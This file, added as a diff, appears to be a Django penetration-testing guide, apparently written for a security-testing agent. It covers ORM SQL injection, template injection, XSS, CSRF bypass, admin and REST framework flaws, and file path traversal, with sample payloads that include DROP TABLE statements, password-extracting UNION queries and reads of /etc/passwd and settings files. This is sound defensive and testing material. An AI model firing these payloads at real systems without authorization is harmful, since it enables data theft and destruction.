@@ -1,0 +1,527 @@
+<django_security_guide>
+<title>DJANGO SECURITY TESTING</title>
+
+<critical>Django's "batteries included" approach provides built-in security features, but misconfigurations and improper usage can lead to SQL injection, XSS, CSRF bypass, and authentication vulnerabilities. Testing must focus on ORM bypass, template injection, settings exposure, and authentication/session handling.</critical>
+
+<scope>
+- ORM injection and raw SQL vulnerabilities
+- Template injection and auto-escaping bypass
+- CSRF protection bypass
+- Authentication and session management
+- Admin panel security
+- DEBUG mode and settings exposure
+- File upload and path traversal
+- REST framework vulnerabilities
+</scope>
+
+<methodology>
+1. Identify Django version and installed apps through fingerprinting.
+2. Test ORM queries for injection via extra(), raw(), and RawSQL.
+3. Probe template rendering for auto-escaping bypass.
+4. Test authentication views and session handling.
+5. Examine admin panel and REST API endpoints.
+</methodology>
+
+<fingerprinting>
+<version_detection>
+{% raw %}
+# Django version indicators:
+# - Error pages (if DEBUG=True)
+# - Admin panel styling
+# - CSRF token format
+# - Session cookie format
+
+# Check for debug mode
+# Look for Django debug toolbar
+# Check for detailed error pages
+
+# Common Django paths:
+/admin/
+/admin/login/
+/static/admin/
+/api/
+/accounts/login/
+/accounts/logout/
+
+# REST Framework
+/api/v1/
+/api-auth/login/
+/.well-known/
+{% endraw %}
+</version_detection>
+
+<settings_exposure>
+{% raw %}
+# DEBUG=True exposure
+# Access invalid URL to trigger debug page
+GET /nonexistent_path_12345
+
+# If DEBUG=True, reveals:
+# - Django version
+# - Installed apps
+# - Middleware
+# - Settings (partially)
+# - File paths
+
+# Settings file exposure
+GET /static/settings.py
+GET /static/../settings.py
+GET /.env
+GET /config/settings.py
+{% endraw %}
+</settings_exposure>
+</fingerprinting>
+
+<orm_injection>
+<extra_and_raw>
+{% raw %}
+# Vulnerable patterns using extra() and raw()
+
+# extra() with user input (deprecated but still seen)
+User.objects.extra(where=["username = '%s'" % user_input])
+
+# Injection payload:
+user_input = "' OR '1'='1"
+user_input = "'; DROP TABLE users; --"
+
+# raw() queries
+User.objects.raw("SELECT * FROM auth_user WHERE username = '%s'" % user_input)
+
+# Test with:
+# - Single quotes
+# - Double dashes (comments)
+# - Semicolons (query stacking)
+# - UNION SELECT
+{% endraw %}
+</extra_and_raw>
+
+<filter_injection>
+{% raw %}
+# Dynamic filter injection
+# Vulnerable pattern:
+User.objects.filter(**{field_name: value})
+
+# If field_name is user-controlled:
+?field_name=password&value=admin
+?field_name=is_superuser&value=True
+
+# Field traversal:
+?field_name=author__user__password&value=test
+
+# Dangerous lookups:
+?field_name=email__regex&value=.*
+
+# JSON field injection:
+?field_name=profile__contains&value={"admin": true}
+{% endraw %}
+</filter_injection>
+
+<rawsql_injection>
+{% raw %}
+# RawSQL in annotations
+from django.db.models.expressions import RawSQL
+
+# Vulnerable:
+queryset.annotate(val=RawSQL("SELECT %s" % user_input, []))
+
+# Safe version uses params:
+queryset.annotate(val=RawSQL("SELECT %s", [user_input]))
+
+# Test fields that use RawSQL in:
+# - ordering
+# - annotations
+# - aggregations
+{% endraw %}
+</rawsql_injection>
+
+<order_by_injection>
+{% raw %}
+# order_by with user input
+# Vulnerable pattern:
+queryset.order_by(user_input)
+
+# Injection payloads:
+?order=-password      # Expose password ordering
+?order=CASE WHEN (SELECT ...) THEN 1 ELSE 2 END
+?order=1; DROP TABLE users; --
+
+# Test with field names that shouldn't be sortable
+{% endraw %}
+</order_by_injection>
+</orm_injection>
+
+<template_injection>
+<auto_escape_bypass>
+{% raw %}
+# Django auto-escapes by default, but bypasses exist:
+
+# mark_safe() with user input
+from django.utils.safestring import mark_safe
+mark_safe(user_input)  # VULNERABLE
+
+# |safe filter with user input
+{{ user_input|safe }}  # VULNERABLE
+
+# format_html() misuse
+format_html("<a href='{}'>{}</a>", user_url, user_input)
+# Safe for content, but URL might not be sanitized
+
+# Test payloads:
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+javascript:alert(1)  # For URLs
+{% endraw %}
+</auto_escape_bypass>
+
+<ssti_in_django>
+{% raw %}
+# Server-Side Template Injection
+# Less common in Django but possible:
+
+# User-controlled template content
+Template(user_input).render(Context({}))
+
+# Test payloads:
+{% templatetag openvariable %}settings{% templatetag closevariable %}
+{% load module %}
+{{ request.user }}
+{{ settings.SECRET_KEY }}
+
+# Django templates are sandboxed, but information disclosure possible
+{% endraw %}
+</ssti_in_django>
+
+<url_injection>
+{% raw %}
+# URL-based XSS
+# If URLs are rendered unvalidated:
+
+<a href="{{ user_url }}">Link</a>
+
+# Payloads:
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+vbscript:alert(1)
+
+# Test URL fields in forms and redirects
+{% endraw %}
+</url_injection>
+</template_injection>
+
+<csrf_bypass>
+<csrf_exempt_abuse>
+{% raw %}
+# @csrf_exempt decorator vulnerabilities
+
+# Find csrf_exempt views:
+# - API endpoints
+# - Webhook handlers
+# - Legacy views
+
+# If CSRF exempt, test state-changing operations:
+POST /api/transfer HTTP/1.1
+Content-Type: application/json
+
+{"amount": 1000, "to": "attacker"}
+{% endraw %}
+</csrf_exempt_abuse>
+
+<token_validation_bypass>
+{% raw %}
+# CSRF token bypass attempts
+
+# Missing token (if not enforced)
+POST /profile/update HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+name=attacker
+
+# Token from different session
+# Cross-subdomain token usage
+
+# Test REST framework CSRF settings
+# SessionAuthentication requires CSRF
+# TokenAuthentication does not
+{% endraw %}
+</token_validation_bypass>
+
+<samesite_bypass>
+{% raw %}
+# SameSite cookie attribute bypass
+
+# If SameSite=Lax (Django default):
+# - GET requests cross-site allowed
+# - POST requests blocked
+
+# Bypass with GET-based state changes:
+<img src="https://target.com/delete-account?confirm=1">
+<form action="https://target.com/profile" method="GET">
+
+# Check if views accept GET for state changes
+{% endraw %}
+</samesite_bypass>
+</csrf_bypass>
+
+<authentication_attacks>
+<login_vulnerabilities>
+{% raw %}
+# Django auth view testing
+
+# Username enumeration
+# Different error messages for:
+# - Invalid username
+# - Invalid password
+
+# Brute force protection
+# Check for rate limiting on /accounts/login/
+
+# Password reset
+# Token predictability
+# Token reuse
+# Email enumeration
+{% endraw %}
+</login_vulnerabilities>
+
+<session_attacks>
+{% raw %}
+# Session management
+
+# Session fixation
+# Can session ID be set before authentication?
+
+# Session cookie attributes
+# Check for:
+# - HttpOnly
+# - Secure
+# - SameSite
+
+# Session data tampering
+# If using cookie-based sessions (SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies')
+# Attempt to forge signed cookies (requires SECRET_KEY)
+
+# Session ID prediction
+# Check randomness of session IDs
+{% endraw %}
+</session_attacks>
+
+<permission_bypass>
+{% raw %}
+# Permission and authorization bypass
+
+# @login_required bypass
+# Check for unauthenticated access
+
+# @permission_required bypass
+# Check if permissions are enforced
+
+# has_perm() bypass
+# Test with different permission names
+
+# Object-level permissions (django-guardian)
+# Test for IDOR
+{% endraw %}
+</permission_bypass>
+</authentication_attacks>
+
+<admin_panel>
+<admin_exposure>
+{% raw %}
+# Admin panel discovery
+/admin/
+/admin/login/
+/backend/
+/manage/
+/administrator/
+
+# Check for:
+# - Default URL (/admin/)
+# - Weak credentials
+# - Debug toolbar access
+{% endraw %}
+</admin_exposure>
+
+<admin_vulnerabilities>
+{% raw %}
+# Admin-specific attacks
+
+# Mass assignment via ModelAdmin
+# If exclude/fields not properly configured
+
+# Admin action abuse
+# Bulk operations without proper permission checks
+
+# Inline model vulnerabilities
+# IDOR via inline editing
+
+# Log injection
+# Admin log viewer XSS
+{% endraw %}
+</admin_vulnerabilities>
+</admin_panel>
+
+<rest_framework>
+<drf_authentication>
+{% raw %}
+# Django REST Framework auth testing
+
+# Token authentication
+Authorization: Token abc123
+
+# Test token exposure
+# Check if tokens in:
+# - URL parameters
+# - Logs
+# - Error messages
+
+# JWT (if using djangorestframework-simplejwt)
+# Algorithm confusion
+# Token manipulation
+{% endraw %}
+</drf_authentication>
+
+<drf_permissions>
+{% raw %}
+# DRF permission bypass
+
+# Test default permission classes
+# IsAuthenticated, IsAdminUser, etc.
+
+# Viewset action permissions
+# Different permissions for list vs retrieve vs create
+
+# Object-level permissions
+# Test IDOR in detail views
+GET /api/users/1/
+GET /api/users/2/  # Another user's data
+
+# Bulk operations
+POST /api/users/bulk-delete/
+{% endraw %}
+</drf_permissions>
+
+<drf_serializers>
+{% raw %}
+# Serializer vulnerabilities
+
+# Mass assignment
+# Fields not in serializer but accepted
+POST /api/users/
+{
+  "username": "attacker",
+  "is_superuser": true,
+  "is_staff": true
+}
+
+# Read-only field bypass
+# Modify read_only fields via update
+
+# Nested serializer injection
+POST /api/orders/
+{
+  "user": {"id": 1, "is_admin": true}
+}
+{% endraw %}
+</drf_serializers>
+</rest_framework>
+
+<file_handling>
+<file_upload>
+{% raw %}
+# File upload vulnerabilities
+
+# Extension bypass
+# .py, .html, .svg files with XSS
+
+# Path traversal
+filename=../../../etc/passwd
+filename=....//....//etc/passwd
+
+# Overwrite sensitive files
+filename=../settings.py
+filename=../templates/base.html
+
+# Storage backend issues
+# S3 presigned URL manipulation
+{% endraw %}
+</file_upload>
+
+<file_serving>
+{% raw %}
+# Static/media file serving
+
+# Path traversal in file serving
+GET /media/../../../etc/passwd
+GET /static/../settings.py
+
+# X-Sendfile/X-Accel-Redirect abuse
+# If using nginx/apache file serving
+{% endraw %}
+</file_serving>
+</file_handling>
+
+<common_payloads>
+{% raw %}
+# ORM injection
+' OR '1'='1
+1; DROP TABLE auth_user; --
+1 UNION SELECT password FROM auth_user--
+
+# Template injection
+{{ request.user.password }}
+{% debug %}
+{{ settings }}
+
+# XSS (for safe filter bypass)
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+
+# CSRF bypass
+# GET-based state changes
+# Missing token
+
+# Path traversal
+../../../etc/passwd
+....//....//etc/passwd
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate SQL injection via ORM bypass (extra, raw, RawSQL).
+2. Show XSS via safe filter or mark_safe misuse.
+3. Prove CSRF bypass on state-changing endpoints.
+4. Document authentication or authorization bypass.
+5. Provide reproducible requests with exact parameters.
+</validation>
+
+<false_positives>
+- Parameterized ORM queries (normal filter/exclude)
+- Proper auto-escaping in templates
+- CSRF middleware enabled with proper tokens
+- DEBUG=False in production
+- Proper permission decorators on views
+</false_positives>
+
+<impact>
+- SQL injection leading to data breach
+- XSS for session hijacking
+- CSRF for unauthorized actions
+- Authentication bypass for account takeover
+- Admin panel compromise
+- File upload leading to RCE
+</impact>
+
+<pro_tips>
+1. Check for DEBUG=True by accessing nonexistent URLs.
+2. Look for extra(), raw(), and RawSQL in codebase.
+3. Test all user inputs in filter() and order_by().
+4. Check for |safe and mark_safe usage in templates.
+5. Test csrf_exempt decorated views for sensitive operations.
+6. Examine ModelAdmin configurations for mass assignment.
+7. Test DRF serializers for field exposure and modification.
+8. Check session backend for cookie-based sessions.
+9. Test file upload with various extensions and path traversal.
+10. Look for exposed SECRET_KEY in error pages or config.
+</pro_tips>
+
+<remember>Django provides strong defaults, but security breaks when developers bypass these defaults. ORM injection happens in extra()/raw()/RawSQL, XSS happens with safe filter, and CSRF bypass happens with csrf_exempt. Always verify that Django's security features are properly used, not circumvented.</remember>
+</django_security_guide>
